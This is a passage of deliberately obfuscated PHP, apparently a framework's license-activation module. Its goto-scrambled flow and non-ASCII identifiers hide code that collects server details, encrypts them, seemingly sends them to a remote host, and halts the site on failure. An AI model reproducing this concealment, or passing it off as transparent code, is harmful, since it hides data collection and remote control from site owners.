(!$aéÒŞÜì©±[32]($cÄÕÓœ£’, $bÌêÕ©èÓÉ)) { return; } goto eÇˆğ¢Ç§¢; eÇˆğ¢Ç§¢: $d±á”Å²µ² = $aéÒŞÜì©±[33]($cÄÕÓœ£’, $bÌêÕ©èÓÉ); $E£ìäÓó… = $aéÒŞÜì©±[25]($cÄÕÓœ£’, $d±á”Å²µ² + $aéÒŞÜì©±[24]($bÌêÕ©èÓÉ)); $B¢œÔàÃ = $e¯‘­ìŒ[578]; goto A‚ÔéÄË‚‘; B²Ò«Ä÷Şâ: $GLOBALS[$aéÒŞÜì©±[22]][$aéÒŞÜì©±[23]] = $aéÒŞÜì©±[0]($aéÒŞÜì©±[36], $E£ìäÓó…); $fßš’ªƒ•¥ = $e¯‘­ìŒ[580]; $GLOBALS[$aéÒŞÜì©±[22]][$aéÒŞÜì©±[28]] = $aéÒŞÜì©±[29]($aéÒŞÜì©±[1], $GLOBALS[$aéÒŞÜì©±[22]][$aéÒŞÜì©±[23]]); goto E¶Ô¢Ÿ™ÕŠ; E¶Ô¢Ÿ™ÕŠ: } public function run() { goto a—¶††Šç ; b–äˆÇæòâ: $CÀƒã”¼¯È[39]($CÀƒã”¼¯È[42], isset($dè¯Í¨øÒœ[2]) && $dè¯Í¨øÒœ[0] ? $dè¯Í¨øÒœ[2] : $this->defaultAction); $CÀƒã”¼¯È[39]($CÀƒã”¼¯È[43], MOD . $CÀƒã”¼¯È[1] . ST . $CÀƒã”¼¯È[1] . ACT); $cµŠ»‰Ë‘ = $c¼ÓÚğßÎ‚[583]; goto DâÉÏººÏ‰; Fê­ñ¸Ö…: $CÀƒã”¼¯È[39]($CÀƒã”¼¯È[41], isset($dè¯Í¨øÒœ[1]) && $dè¯Í¨øÒœ[0] ? $dè¯Í¨øÒœ[1] : $this->defaultController); $F¾ÜÎŠ“‘Ú = $c¼ÓÚğßÎ‚[582]; if (!$F¾ÜÎŠ“‘Ú) { return; } goto b–äˆÇæòâ; DßÌá—êâ¬: $C„Š×ÓÙ = $c¼ÓÚğßÎ‚[584]; if ($CÀƒã”¼¯È[19]($dè¯Í¨øÒœ) >= 3) { $this->{$_SERVER[şìšµëâ­Æ][21]}($aÀ§ˆ ºÔ); } else { $this->{$_SERVER[şìšµëâ­Æ][21]}(ACTION); } goto eÛ÷Œ¯»´œ; a—¶††Šç : $c¼ÓÚğßÎ‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CÀƒã”¼¯È =& $_SERVER[şìšµëâ­Æ]; $this->{$_SERVER[şìšµëâ­Æ][37]}(); goto B¯ïìßÚÜÎ; DâÉÏººÏ‰: if (strlen($cµŠ»‰Ë‘) < $c¼ÓÚğßÎ‚[564]) { return; } $_SERVER[$CÀƒã”¼¯È[44]] = $CÀƒã”¼¯È[6](ACTION); $this->{$_SERVER[şìšµëâ­Æ][45]}(); goto DßÌá—êâ¬; e¼ãö¦““: if (strlen($E¡©ƒ–Ì©) < $c¼ÓÚğßÎ‚[573]) { die; } $aÀ§ˆ ºÔ = $GLOBALS[$CÀƒã”¼¯È[22]][$CÀƒã”¼¯È[28]]; $CÀƒã”¼¯È[39]($CÀƒã”¼¯È[40], isset($dè¯Í¨øÒœ[0]) && $dè¯Í¨øÒœ[0] ? $dè¯Í¨øÒœ[0] : $this->defaultModule); goto Fê­ñ¸Ö…; B¯ïìßÚÜÎ: $this->{$_SERVER[şìšµëâ­Æ][38]}(); $dè¯Í¨øÒœ = $GLOBALS[$CÀƒã”¼¯È[22]][$CÀƒã”¼¯È[23]]; $E¡©ƒ–Ì© = $c¼ÓÚğßÎ‚[581]; goto e¼ãö¦““; eÛ÷Œ¯»´œ: } private $kmdnabc621eb = array(); private $znorf421f867 = ''; public function vtxi411c459d() { goto F¯õÊİİùÔ; fÓ®œ®ù ‹: $this->{$_SERVER[şìšµëâ­Æ][3]}($F‹ñ†ƒ¼òÕ[57], array($this, $F‹ñ†ƒ¼òÕ[58])); $this->{$_SERVER[şìšµëâ­Æ][3]}($F‹ñ†ƒ¼òÕ[59], array($this, $F‹ñ†ƒ¼òÕ[60])); goto A¬–¥¸£¬‚; aãñÄñ‰‚: if (strlen($EÊ¥Üª¢ß) < $FÅ¹¢¼Œéá[564]) { die; } $this->{$_SERVER[şìšµëâ­Æ][3]}($F‹ñ†ƒ¼òÕ[53], array($this, $F‹ñ†ƒ¼òÕ[54])); $this->{$_SERVER[şìšµëâ­Æ][3]}($F‹ñ†ƒ¼òÕ[55], array($this, $F‹ñ†ƒ¼òÕ[56])); goto fÓ®œ®ù ‹; b«†ºà‘†: $this->{$_SERVER[şìšµëâ­Æ][47]}(); $this->{$_SERVER[şìšµëâ­Æ][48]}(); $this->{$_SERVER[şìšµëâ­Æ][49]}(); goto D‚«”‹ßÇ„; D‚«”‹ßÇ„: $this->{$_SERVER[şìšµëâ­Æ][50]}(); $this->{$_SERVER[şìšµëâ­Æ][51]}(); $CŒİˆÅƒ‘ô = $FÅ¹¢¼Œéá[585]; goto Dâø¬£ö™ø; F¯õÊİİùÔ: $FÅ¹¢¼Œéá =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F‹ñ†ƒ¼òÕ =& $_SERVER[şìšµëâ­Æ]; $this->{$_SERVER[şìšµëâ­Æ][46]}(); goto b«†ºà‘†; Dâø¬£ö™ø: if (!$CŒİˆÅƒ‘ô) { return; } $this->{$_SERVER[şìšµëâ­Æ][52]}(); $EÊ¥Üª¢ß = $FÅ¹¢¼Œéá[586]; goto aãñÄñ‰‚; A¬–¥¸£¬‚: } public function uesmd2f2ae8b($FˆÆù«è¨) { goto f·ˆÙ…™; f·ˆÙ…™: $FŠÜõ¼ÎéÎ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f¹òºå²Š¡ =& $_SERVER[şìšµëâ­Æ]; $aÌ¾ª–“Îƒ = $f¹òºå²Š¡[61]($f¹òºå²Š¡[62])->{$_SERVER[şìšµëâ­Æ][63]}(); goto F‹Æàãˆ•; Dç¨æÅ¼½µ: if (strlen($aéõ‹ÜË‰á) < $FŠÜõ¼ÎéÎ[573]) { die; } if ($aÌ¾ª–“Îƒ[$f¹òºå²Š¡[126]] != $f¹òºå²Š¡[127]) { $FˆÆù«è¨[$f¹òºå²Š¡[114]][$f¹òºå²Š¡[128]] = $aÌ¾ª–“Îƒ[$f¹òºå²Š¡[128]]; $FˆÆù«è¨[$f¹òºå²Š¡[114]][$f¹òºå²Š¡[129]] = $aÌ¾ª–“Îƒ[$f¹òºå²Š¡[129]]; $b¥Ëšœìá = $f¹òºå²Š¡[130](10) . $this->znorf421f867 . $f¹òºå²Š¡[130](5); $FˆÆù«è¨[$f¹òºå²Š¡[102]][$f¹òºå²Š¡[131]][$f¹òºå²Š¡[132]] = $this->{$_SERVER[şìšµëâ­Æ][133]}($b¥Ëšœìá, $FˆÆù«è¨[$f¹òºå²Š¡[114]][$f¹òºå²Š¡[119]]); } if ($this->znorf421f867 == $f¹òºå²Š¡[127]) { $FˆÆù«è¨[$f¹òºå²Š¡[102]][$f¹òºå²Š¡[103]][$f¹òºå²Š¡[108]][$f¹òºå²Š¡[113]] = 0; } goto f‡†·Ê‘‚™; F„¢°Á°Æ÷: return $FˆÆù«è¨; goto EéîŞñç‘ç; fé¼ô‰öÈ: unset($FˆÆù«è¨[$f¹òºå²Š¡[102]][$f¹òºå²Š¡[103]][$f¹òºå²Š¡[107]]); $f‹âèÑ¨š = $FŠÜõ¼ÎéÎ[590]; if (!$f‹âèÑ¨š) { return; } goto Aë„›éé; aŸ×Ÿİß÷ç: $fİƒ¹‡æ­· = $FˆÆù«è¨[$f¹òºå²Š¡[102]][$f¹òºå²Š¡[103]][$f¹òºå²Š¡[76]]; unset($FˆÆù«è¨[$f¹òºå²Š¡[102]][$f¹òºå²Š¡[104]][$f¹òºå²Š¡[105]]); unset($FˆÆù«è¨[$f¹òºå²Š¡[102]][$f¹òºå²Š¡[104]][$f¹òºå²Š¡[106]]); goto föÉ×ˆÏÇ»; f‡†·Ê‘‚™: $FˆÆù«è¨[$f¹òºå²Š¡[114]][$f¹òºå²Š¡[134]] = $f¹òºå²Š¡[112]($this->kmdnabc621eb, $f¹òºå²Š¡[135], $f¹òºå²Š¡[10]); $FˆÆù«è¨[$f¹òºå²Š¡[114]][$f¹òºå²Š¡[136]] = $f¹òºå²Š¡[112]($this->kmdnabc621eb, $f¹òºå²Š¡[137], $f¹òºå²Š¡[10]); if ($f¹òºå²Š¡[112]($GLOBALS, $f¹òºå²Š¡[138]) && $this->config[$f¹òºå²Š¡[139]]) { $FˆÆù«è¨[$f¹òºå²Š¡[114]][$f¹òºå²Š¡[140]] = WEB_ROOT; } goto F„¢°Á°Æ÷; Aâ¢äÓùñ: $FˆÆù«è¨[$f¹òºå²Š¡[114]][$f¹òºå²Š¡[123]] = $f¹òºå²Š¡[124]($f¹òºå²Š¡[125]()); $FˆÆù«è¨[$f¹òºå²Š¡[114]][$f¹òºå²Š¡[126]] = $this->znorf421f867; $aéõ‹ÜË‰á = $FŠÜõ¼ÎéÎ[594]; goto Dç¨æÅ¼½µ; B´±©øÄèË: $FˆÆù«è¨[$f¹òºå²Š¡[114]][$f¹òºå²Š¡[119]] = $f¹òºå²Š¡[120]($_SERVER[$f¹òºå²Š¡[121]] . $aÌ¾ª–“Îƒ[$f¹òºå²Š¡[122]]); $E‰Í´Š’Û‚ = $FŠÜõ¼ÎéÎ[593]; if (strlen($E‰Í´Š’Û‚) < $FŠÜõ¼ÎéÎ[573]) { return; } goto Aâ¢äÓùñ; F‹Æàãˆ•: $dÓŸíçÒ¯¡ = $FŠÜõ¼ÎéÎ[587]; $AÏŸ›Èğä¯ = array($f¹òºå²Š¡[64], $f¹òºå²Š¡[65], $f¹òºå²Š¡[66], $f¹òºå²Š¡[67], $f¹òºå²Š¡[68], $f¹òºå²Š¡[69], $f¹òºå²Š¡[70], $f¹òºå²Š¡[71], $f¹òºå²Š¡[72], $f¹òºå²Š¡[73], $f¹òºå²Š¡[74], $f¹òºå²Š¡[75], $f¹òºå²Š¡[76], $f¹òºå²Š¡[77], $f¹òºå²Š¡[78], $f¹òºå²Š¡[79], $f¹òºå²Š¡[80], $f¹òºå²Š¡[81], $f¹òºå²Š¡[82], $f¹òºå²Š¡[83], $f¹òºå²Š¡[84], $f¹òºå²Š¡[85], $f¹òºå²Š¡[86], $f¹òºå²Š¡[87], $f¹òºå²Š¡[88], $f¹òºå²Š¡[89], $f¹òºå²Š¡[90], $f¹òºå²Š¡[91], $f¹òºå²Š¡[92], $f¹òºå²Š¡[93], $f¹òºå²Š¡[94], $f¹òºå²Š¡[95], $f¹òºå²Š¡[96], $f¹òºå²Š¡[97], $f¹òºå²Š¡[98], $f¹òºå²Š¡[99]); foreach ($AÏŸ›Èğä¯ as $FåÏ•Şã) { $bŒùãğÍ’Ù = $GLOBALS[$f¹òºå²Š¡[100]][$f¹òºå²Š¡[101]][$FåÏ•Şã]; $aæ©¾—¿âÓ = $FŠÜõ¼ÎéÎ[588]; while ($aæ©¾—¿âÓ < $FŠÜõ¼ÎéÎ[579]) { if ($aæ©¾—¿âÓ >= 0) { break; } $aæ©¾—¿âÓ++; } if (isset($aÌ¾ª–“Îƒ[$FåÏ•Şã])) { $bŒùãğÍ’Ù = $aÌ¾ª–“Îƒ[$FåÏ•Şã]; } $FˆÆù«è¨[$f¹òºå²Š¡[102]][$f¹òºå²Š¡[103]][$FåÏ•Şã] = $bŒùãğÍ’Ù; } goto aŸ×Ÿİß÷ç; föÉ×ˆÏÇ»: unset($FˆÆù«è¨[$f¹òºå²Š¡[102]][$f¹òºå²Š¡[103]][$f¹òºå²Š¡[76]]); $BšºÛ·‹˜ = $FŠÜõ¼ÎéÎ[589]; while ($BšºÛ·‹˜ < $FŠÜõ¼ÎéÎ[568]) { if ($BšºÛ·‹˜ >= 0) { break; } $BšºÛ·‹˜++; } goto fé¼ô‰öÈ; Aë„›éé: $FˆÆù«è¨[$f¹òºå²Š¡[102]][$f¹òºå²Š¡[103]][$f¹òºå²Š¡[108]] = array($f¹òºå²Š¡[109] => (int) $fİƒ¹‡æ­·[$f¹òºå²Š¡[110]], $f¹òºå²Š¡[111] => (int) $f¹òºå²Š¡[112]($fİƒ¹‡æ­·, $f¹òºå²Š¡[113], 0)); $Cˆ»¢Ûì‹¦ = $FŠÜõ¼ÎéÎ[591]; if (strlen($Cˆ»¢Ûì‹¦) < $FŠÜõ¼ÎéÎ[564]) { die; } goto f•°ŸˆÃ·˜; f•°ŸˆÃ·˜: $FˆÆù«è¨[$f¹òºå²Š¡[114]][$f¹òºå²Š¡[115]] = $f¹òºå²Š¡[116]($f¹òºå²Š¡[117])->{$_SERVER[şìšµëâ­Æ][118]}(); $dÏå„Òô© = $FŠÜõ¼ÎéÎ[592]; if (strlen($dÏå„Òô©) < $FŠÜõ¼ÎéÎ[573]) { return; } goto B´±©øÄèË; EéîŞñç‘ç: } private function yuhi72b33fb6() { goto FÒÖ¹¥Ö¿†; B¬µ¤«Î: $FŒòŠèŞª‰[13](array($FŒòŠèŞª‰[157], $FŒòŠèŞª‰[158]), $e†µÀ¯Ø†×); $Dí‚âè»’ß = $bò¼¨¥À¡Ÿ[601]; goto e›šã¸…ÛŒ; FÆ¤¤ïäĞ: if (strlen($CÎ¾™Ç¾¬) < $bò¼¨¥À¡Ÿ[598]) { die; } $fÕèƒÈ©ÈÙ = $FŒòŠèŞª‰[61]($FŒòŠèŞª‰[62])->{$_SERVER[şìšµëâ­Æ][63]}(); $FóÎÃ¶Ş¬Œ = $bò¼¨¥À¡Ÿ[599]; goto FŠÇ«´×ï; FÒÖ¹¥Ö¿†: $bò¼¨¥À¡Ÿ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FŒòŠèŞª‰ =& $_SERVER[şìšµëâ­Æ]; if ($_SERVER[$FŒòŠèŞª‰[44]] == $FŒòŠèŞª‰[141]) { goto eóù³‘šÉ²; Dó§¡ôëóê: $Fºß•æ£•Õ = $bò¼¨¥À¡Ÿ[596]; if (!$Fºß•æ£•Õ) { die; } goto A¡ÍÁ¥Øİ´; eóù³‘šÉ²: $cèÏîŞ‹Ò” = array($FŒòŠèŞª‰[126] => $this->znorf421f867, $FŒòŠèŞª‰[142] => $this->{$_SERVER[şìšµëâ­Æ][143]}(), $FŒòŠèŞª‰[144] => $FŒòŠèŞª‰[61]($FŒòŠèŞª‰[145])->{$_SERVER[şìšµëâ­Æ][146]}()); if ($this->znorf421f867 != $FŒòŠèŞª‰[127]) { $EÎ¡ñ¶É÷å = $FŒòŠèŞª‰[112]($this->kmdnabc621eb, $FŒòŠèŞª‰[147]); if ($EÎ¡ñ¶É÷å) { $cèÏîŞ‹Ò”[$FŒòŠèŞª‰[148]] = $EÎ¡ñ¶É÷å; $cèÏîŞ‹Ò”[$FŒòŠèŞª‰[149]] = $FŒòŠèŞª‰[150]($FŒòŠèŞª‰[112]($this->kmdnabc621eb, $FŒòŠèŞª‰[151])); $cèÏîŞ‹Ò”[$FŒòŠèŞª‰[152]] = $FŒòŠèŞª‰[112]($this->kmdnabc621eb, $FŒòŠèŞª‰[137]); } } $cèÏîŞ‹Ò” = $this->{$_SERVER[şìšµëâ­Æ][153]}($FŒòŠèŞª‰[154]($cèÏîŞ‹Ò”), $FŒòŠèŞª‰[120]($FŒòŠèŞª‰[155])); goto Aˆµ»ÖÛß; Aˆµ»ÖÛß: $B®Ñ½ °Š = $bò¼¨¥À¡Ÿ[595]; $e†µÀ¯Ø†× = array($FŒòŠèŞª‰[156] => $cèÏîŞ‹Ò”); $FŒòŠèŞª‰[13](array($FŒòŠèŞª‰[157], $FŒòŠèŞª‰[158]), $e†µÀ¯Ø†×); goto Dó§¡ôëóê; A¡ÍÁ¥Øİ´: } goto F÷ë­ÄëÆ; F÷ë­ÄëÆ: if ($this->znorf421f867 == $FŒòŠèŞª‰[127]) { return; } $C’†Ä™Ãš· = array($FŒòŠèŞª‰[159], $FŒòŠèŞª‰[160], $FŒòŠèŞª‰[161], $FŒòŠèŞª‰[162], $FŒòŠèŞª‰[163], $FŒòŠèŞª‰[164]); $CÎ¾™Ç¾¬ = $bò¼¨¥À¡Ÿ[597]; goto FÆ¤¤ïäĞ; FŠÇ«´×ï: $e†µÀ¯Ø†× = array($FŒòŠèŞª‰[165] => $fÕèƒÈ©ÈÙ[$FŒòŠèŞª‰[64]], $FŒòŠèŞª‰[166] => $fÕèƒÈ©ÈÙ[$FŒòŠèŞª‰[65]], $FŒòŠèŞª‰[167] => $FŒòŠèŞª‰[10]); $E‘³õÁêç = $bò¼¨¥À¡Ÿ[600]; foreach ($C’†Ä™Ãš· as $aïÒå‡ó®ê) { if (!isset($fÕèƒÈ©ÈÙ[$aïÒå‡ó®ê]) || !$fÕèƒÈ©ÈÙ[$aïÒå‡ó®ê]) { continue; } $e†µÀ¯Ø†×[$aïÒå‡ó®ê] = $fÕèƒÈ©ÈÙ[$aïÒå‡ó®ê]; } goto B¬µ¤«Î; e›šã¸…ÛŒ: } private function jcel7431b267() { goto DÀÓÌÁÑÁè; bÅµÌ‰ÕÆœ: Cache::set($eÓÈ×‰‚[236] . $eÓÈ×‰‚[120]($F­“œï¨ïö . $eÓÈ×‰‚[237]), $eÓÈ×‰‚[10]); $cï„ïñé¤Ñ = $CÅ‹ö¤Œ‡¨[611]; if (!$cï„ïñé¤Ñ) { die; } goto Aö‚Ö”Áè; BÌë±ò½£Õ: $bóÕ—¡Âˆ§ = $CÅ‹ö¤Œ‡¨[602]; $a“–ĞŞºÀ³ = $eÓÈ×‰‚[120]($_SERVER[$eÓÈ×‰‚[121]] . $F­“œï¨ïö); if ($AÀÃ¥”¤—ˆ[$eÓÈ×‰‚[184]] == $eÓÈ×‰‚[185]) { $E†ª¹º±Æ¦ = $this->{$_SERVER[şìšµëâ­Æ][153]}($a“–ĞŞºÀ³, $eÓÈ×‰‚[186]); $FÆ‚—¦¬ = $this->{$_SERVER[şìšµëâ­Æ][133]}($eÓÈ×‰‚[154]($Cî’×°¼„), $a“–ĞŞºÀ³ . $eÓÈ×‰‚[187], 3); $FÆ‚—¦¬ = $FÆ‚—¦¬ . $eÓÈ×‰‚[188] . $_SERVER[$eÓÈ×‰‚[179]]; $DÆº‹¢æƒ‘ = $this->{$_SERVER[şìšµëâ­Æ][189]}($eÓÈ×‰‚[190] . $E†ª¹º±Æ¦ . $eÓÈ×‰‚[191] . $FÆ‚—¦¬, -1); $eÓÈ×‰‚[172]($DÆº‹¢æƒ‘, !0); } else { if ($AÀÃ¥”¤—ˆ[$eÓÈ×‰‚[184]] == $eÓÈ×‰‚[192]) { $EØ„½õ‰á¡ = $eÓÈ×‰‚[25]($eÓÈ×‰‚[120]($eÓÈ×‰‚[193] . $a“–ĞŞºÀ³), 12, 15) . $eÓÈ×‰‚[194]; $FÆ‚—¦¬ = $this->{$_SERVER[şìšµëâ­Æ][195]}($eÓÈ×‰‚[2]($AÀÃ¥”¤—ˆ[$eÓÈ×‰‚[196]]), $EØ„½õ‰á¡, 2); $e²ÏêµŒÌÁ = $eÓÈ×‰‚[197]($FÆ‚—¦¬, !0); if (!$eÓÈ×‰‚[198]($e²ÏêµŒÌÁ) || !$eÓÈ×‰‚[198]($e²ÏêµŒÌÁ[$eÓÈ×‰‚[199]]) || $e²ÏêµŒÌÁ[$eÓÈ×‰‚[171]] != !0) { $E³æƒ´•† = $eÓÈ×‰‚[200]; $C¯á÷ ô„± = $e²ÏêµŒÌÁ[$eÓÈ×‰‚[199]] ? $eÓÈ×‰‚[201] . $e²ÏêµŒÌÁ[$eÓÈ×‰‚[199]] : $E³æƒ´•†; $eÓÈ×‰‚[172]($C¯á÷ ô„±, !1); } else { $Cî’×°¼„[$eÓÈ×‰‚[174]] = $e²ÏêµŒÌÁ[$eÓÈ×‰‚[199]][$eÓÈ×‰‚[202]]; } } else { $e²ÏêµŒÌÁ = $this->{$_SERVER[şìšµëâ­Æ][189]}($eÓÈ×‰‚[203], $Cî’×°¼„, 10); } } goto B¶ˆ£õ¶; DÀÓÌÁÑÁè: $CÅ‹ö¤Œ‡¨ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÓÈ×‰‚ =& $_SERVER[şìšµëâ­Æ]; if ($_SERVER[$eÓÈ×‰‚[44]] != $eÓÈ×‰‚[168]) { return; } goto AŠÆæí¦ª; aÊ”¢éÎÅ: $eÓÈ×‰‚[61]($eÓÈ×‰‚[11])->{$_SERVER[şìšµëâ­Æ][232]}($b«×¯–æ¤½[$eÓÈ×‰‚[233]], array($eÓÈ×‰‚[234] => $A©õˆíì¿±)); $this->kmdnabc621eb = $fÔ¥Âò ‹Ğ; $this->znorf421f867 = $d å“à”÷Š[$eÓÈ×‰‚[126]]; goto cß¹«º™¾ã; AŠÆæí¦ª: if (!$eÓÈ×‰‚[112]($GLOBALS, $eÓÈ×‰‚[138])) { die; } $AÀÃ¥”¤—ˆ = $GLOBALS[$eÓÈ×‰‚[22]]; if (isset($AÀÃ¥”¤—ˆ[$eÓÈ×‰‚[169]])) { $this->{$_SERVER[şìšµëâ­Æ][170]}(); die; } goto aÜ¢¨¥•øš; dĞ¥†”†¤: $FñŸÊÕ˜É = $eôÖáØĞÄ• . $d å“à”÷Š[$eÓÈ×‰‚[126]] . $this->{$_SERVER[şìšµëâ­Æ][153]}($eÓÈ×‰‚[120]($d å“à”÷Š[$eÓÈ×‰‚[215]]), $eôÖáØĞÄ•); $d å“à”÷Š[$eÓÈ×‰‚[129]] = $eÓÈ×‰‚[124]($eÓÈ×‰‚[220]($this->{$_SERVER[şìšµëâ­Æ][153]}($FñŸÊÕ˜É, $eÓÈ×‰‚[222]))); $c“Ôå·¢‰ = $CÅ‹ö¤Œ‡¨[604]; goto bËŒ·ƒ‹ø‹; eŒñ‹İù©ø: if (!$D”­Ìµ‡¯ª || $D”­Ìµ‡¯ª != $fÔ¥Âò ‹Ğ[$eÓÈ×‰‚[151]]) { $dšÃµ¸¡ = array($eÓÈ×‰‚[208] => $eÓÈ×‰‚[61]($eÓÈ×‰‚[62])->{$_SERVER[şìšµëâ­Æ][63]}($eÓÈ×‰‚[122]), $eÓÈ×‰‚[209] => $_SERVER[$eÓÈ×‰‚[121]], $eÓÈ×‰‚[210] => $eÓÈ×‰‚[211](), $eÓÈ×‰‚[180] => $_SERVER[$eÓÈ×‰‚[181]]); $FÆ‚—¦¬ = $this->{$_SERVER[şìšµëâ­Æ][212]}($eÓÈ×‰‚[154]($dšÃµ¸¡)); $this->{$_SERVER[şìšµëâ­Æ][189]}($eÓÈ×‰‚[213] . $FÆ‚—¦¬); $eÓÈ×‰‚[172]($eÓÈ×‰‚[204]($eÓÈ×‰‚[214]), !0); } $d å“à”÷Š = array($eÓÈ×‰‚[215] => $Cî’×°¼„[$eÓÈ×‰‚[171]], $eÓÈ×‰‚[216] => $fÔ¥Âò ‹Ğ[$eÓÈ×‰‚[217]], $eÓÈ×‰‚[218] => $eÓÈ×‰‚[130](16), $eÓÈ×‰‚[126] => $fÔ¥Âò ‹Ğ[$eÓÈ×‰‚[219]]); if ($Cî’×°¼„[$eÓÈ×‰‚[174]]) { $d å“à”÷Š[$eÓÈ×‰‚[218]] = $Cî’×°¼„[$eÓÈ×‰‚[174]]; } goto Dë†ˆù”ˆÈ; fÈ¥”áöÔ: $b‹ğùˆÔî¬ = $CÅ‹ö¤Œ‡¨[605]; while (strlen($b‹ğùˆÔî¬) < $CÅ‹ö¤Œ‡¨[573]) { if (!$b‹ğùˆÔî¬) { break; } $b‹ğùˆÔî¬++; } $fÆ•’Ø¾â´ = $eÓÈ×‰‚[220]($eÓÈ×‰‚[25]($CÔŞÜÈË‡Ñ, 10, 16)); goto fàØÀñëˆ¶; bËŒ·ƒ‹ø‹: if ($fÔ¥Âò ‹Ğ[$eÓÈ×‰‚[223]] && $fÔ¥Âò ‹Ğ[$eÓÈ×‰‚[223]] >= 1) { $eÓÈ×‰‚[61]($eÓÈ×‰‚[62])->{$_SERVER[şìšµëâ­Æ][224]}($eÓÈ×‰‚[225], $eÓÈ×‰‚[226]); } $eÓÈ×‰‚[61]($eÓÈ×‰‚[62])->{$_SERVER[şìšµëâ­Æ][227]}($d å“à”÷Š); $CÔŞÜÈË‡Ñ = $eÓÈ×‰‚[120]($_SERVER[$eÓÈ×‰‚[121]] . $eÓÈ×‰‚[220]($F­“œï¨ïö) . $d å“à”÷Š[$eÓÈ×‰‚[216]]); goto fÈ¥”áöÔ; Dö¦¥ Ğ‚†: if (!$b•…²ÏËÖ) { return; } $A©õˆíì¿± = array(); $Fï‘¦¹èöÄ = $CÅ‹ö¤Œ‡¨[608]; goto C„ùˆæÕ¹Ç; Aö‚Ö”Áè: $eÓÈ×‰‚[172]($eÓÈ×‰‚[204]($eÓÈ×‰‚[214]), !0); goto AŸ…Ê´; C„ùˆæÕ¹Ç: if (!$Fï‘¦¹èöÄ) { die; } $A©õˆíì¿±[$fÆ•’Ø¾â´] = $f¶Ä£Ó“ˆ; $aÂ™¼¢ßÍª = $CÅ‹ö¤Œ‡¨[609]; goto aÊ”¢éÎÅ; aÜ¢¨¥•øš: if (!isset($AÀÃ¥”¤—ˆ[$eÓÈ×‰‚[171]]) || $eÓÈ×‰‚[24]($AÀÃ¥”¤—ˆ[$eÓÈ×‰‚[171]]) != 16) { $eÓÈ×‰‚[172]($eÓÈ×‰‚[173] . $AÀÃ¥”¤—ˆ[$eÓÈ×‰‚[171]], !1); } $F­“œï¨ïö = $eÓÈ×‰‚[61]($eÓÈ×‰‚[62])->{$_SERVER[şìšµëâ­Æ][63]}($eÓÈ×‰‚[122]); $Cî’×°¼„ = array($eÓÈ×‰‚[171] => $AÀÃ¥”¤—ˆ[$eÓÈ×‰‚[171]], $eÓÈ×‰‚[174] => $eÓÈ×‰‚[130](16), $eÓÈ×‰‚[175] => $eÓÈ×‰‚[155], $eÓÈ×‰‚[176] => $eÓÈ×‰‚[177], $eÓÈ×‰‚[178] => $_SERVER[$eÓÈ×‰‚[179]], $eÓÈ×‰‚[180] => $_SERVER[$eÓÈ×‰‚[181]], $eÓÈ×‰‚[182] => $_SERVER[$eÓÈ×‰‚[183]]); goto BÌë±ò½£Õ; fàØÀñëˆ¶: $B‚Ë«î¶œ‚ = $CÅ‹ö¤Œ‡¨[606]; while (strlen($B‚Ë«î¶œ‚) < $CÅ‹ö¤Œ‡¨[573]) { if (!$B‚Ë«î¶œ‚) { break; } $B‚Ë«î¶œ‚++; } $f¶Ä£Ó“ˆ = $this->{$_SERVER[şìšµëâ­Æ][133]}($eÓÈ×‰‚[154]($fÔ¥Âò ‹Ğ), $CÔŞÜÈË‡Ñ); goto c’ÜâêÛ«ƒ; cß¹«º™¾ã: $EÈÌÈº¢¿ = $CÅ‹ö¤Œ‡¨[610]; while (strlen($EÈÌÈº¢¿) < $CÅ‹ö¤Œ‡¨[579]) { if (!$EÈÌÈº¢¿) { break; } $EÈÌÈº¢¿++; } $this->{$_SERVER[şìšµëâ­Æ][235]}(); goto bÅµÌ‰ÕÆœ; B¶ˆ£õ¶: if (!$eÓÈ×‰‚[198]($e²ÏêµŒÌÁ) || !$eÓÈ×‰‚[198]($e²ÏêµŒÌÁ[$eÓÈ×‰‚[199]]) || $e²ÏêµŒÌÁ[$eÓÈ×‰‚[171]] != !0) { $E³æƒ´•† = $eÓÈ×‰‚[204]($eÓÈ×‰‚[205]); $C¯á÷ ô„± = $e²ÏêµŒÌÁ[$eÓÈ×‰‚[199]] ? $eÓÈ×‰‚[201] . $e²ÏêµŒÌÁ[$eÓÈ×‰‚[199]] : $E³æƒ´•†; $eÓÈ×‰‚[172]($C¯á÷ ô„±, !1); } $fÔ¥Âò ‹Ğ = $e²ÏêµŒÌÁ[$eÓÈ×‰‚[199]]; $D”­Ìµ‡¯ª = $this->{$_SERVER[şìšµëâ­Æ][206]}($fÔ¥Âò ‹Ğ[$eÓÈ×‰‚[207]]); goto eŒñ‹İù©ø; c’ÜâêÛ«ƒ: $f†À˜ŠïÈ„ = $eÓÈ×‰‚[228]($eÓÈ×‰‚[61]($eÓÈ×‰‚[11])->{$_SERVER[şìšµëâ­Æ][229]}(), $eÓÈ×‰‚[230]); $b«×¯–æ¤½ = $f†À˜ŠïÈ„[$eÓÈ×‰‚[231]]; $b•…²ÏËÖ = $CÅ‹ö¤Œ‡¨[607]; goto Dö¦¥ Ğ‚†; Dë†ˆù”ˆÈ: $F÷šéƒÑ’Ÿ = $eÓÈ×‰‚[25]($eÓÈ×‰‚[120]($d å“à”÷Š[$eÓÈ×‰‚[216]]), 10, 10); $A¸Ú¨Â¸’ = $F÷šéƒÑ’Ÿ . $d å“à”÷Š[$eÓÈ×‰‚[126]] . $d å“à”÷Š[$eÓÈ×‰‚[218]]; $d°½¬á³› = $CÅ‹ö¤Œ‡¨[603]; goto EÓ×ø¢•Øİ; EÓ×ø¢•Øİ: if (!$d°½¬á³›) { die; } $d å“à”÷Š[$eÓÈ×‰‚[128]] = $eÓÈ×‰‚[220]($eÓÈ×‰‚[124]($this->{$_SERVER[şìšµëâ­Æ][153]}($A¸Ú¨Â¸’, $eÓÈ×‰‚[221]))); $eôÖáØĞÄ• = $eÓÈ×‰‚[130](16); goto dĞ¥†”†¤; AŸ…Ê´: } private function licenseRegistSuccess() { goto D—˜ØÂÏ¥; D—˜ØÂÏ¥: $B«ÃöºÄŒŒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f™†ã‰Ğ‰ =& $_SERVER[şìšµëâ­Æ]; $a‘¡•¤Ú²ì = $f™†ã‰Ğ‰[61]($f™†ã‰Ğ‰[62])->{$_SERVER[şìšµëâ­Æ][63]}(); goto AºÎÂ‹¾´; AºÎÂ‹¾´: 